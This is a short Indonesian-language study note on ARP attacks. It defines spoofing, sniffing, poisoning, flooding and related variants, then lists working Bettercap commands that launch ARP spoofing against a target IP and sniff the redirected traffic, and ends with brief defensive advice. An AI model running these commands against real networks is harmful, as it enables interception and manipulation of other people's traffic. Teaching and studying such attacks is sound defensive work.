# ARP Attack

## Jenis Serangan ARP

### 1. ARP Spoofing
**Definisi:**
Penyerang mengirim paket ARP palsu untuk menghubungkan IP korban dengan MAC miliknya, memungkinkan penyadapan atau manipulasi lalu lintas.

### 2. ARP Sniffing
**Definisi:**
Penyerang menangkap paket ARP untuk melihat komunikasi dalam jaringan.

### 3. ARP Poisoning
**Definisi:**
Penyerang mengirim banyak paket ARP palsu untuk merusak tabel ARP.

### 4. ARP Flooding
**Definisi:**
Penyerang membanjiri jaringan dengan paket ARP acak, menyebabkan overload pada switch.

### 5. Proxy ARP Attack
**Definisi:**
Perangkat tidak sah bertindak sebagai proxy ARP, mengelabui perangkat agar mengirim lalu lintas melalui dirinya.

### 6. ARP Cache Poisoning
**Definisi:**
Penyerang memanipulasi tabel ARP cache dengan data palsu.

## Teknik Serangan dengan Bettercap
Bettercap adalah alat yang digunakan untuk melakukan berbagai serangan jaringan, termasuk ARP Attack. Berikut beberapa tekniknya:

### 1. ARP Spoofing dengan Bettercap
```bash
bettercap -iface eth0
```
Lalu aktifkan modul ARP Spoofing:
```bash
set arp.spoof.targets 192.168.1.100
arp.spoof on
```

### 2. Sniffing Paket
```bash
net.sniff on
```
Dengan perintah ini, Bettercap akan menangkap lalu lintas jaringan yang melewati perangkat target.

### 3. Manipulasi Paket ARP
Untuk mengarahkan trafik ke perangkat penyerang:
```bash
set arp.spoof.fullduplex true
set arp.spoof.internal true
arp.spoof on
```

## Kesimpulan
Serangan ARP beroperasi di lapisan 2 OSI dan sering tidak terdeteksi oleh firewall biasa. Teknik seperti ARP Spoofing dan Sniffing dapat dilakukan dengan alat seperti Bettercap. Pencegahan efektif memerlukan kombinasi Static ARP, Dynamic ARP Inspection, enkripsi jaringan, serta monitoring rutin untuk keamanan jaringan.

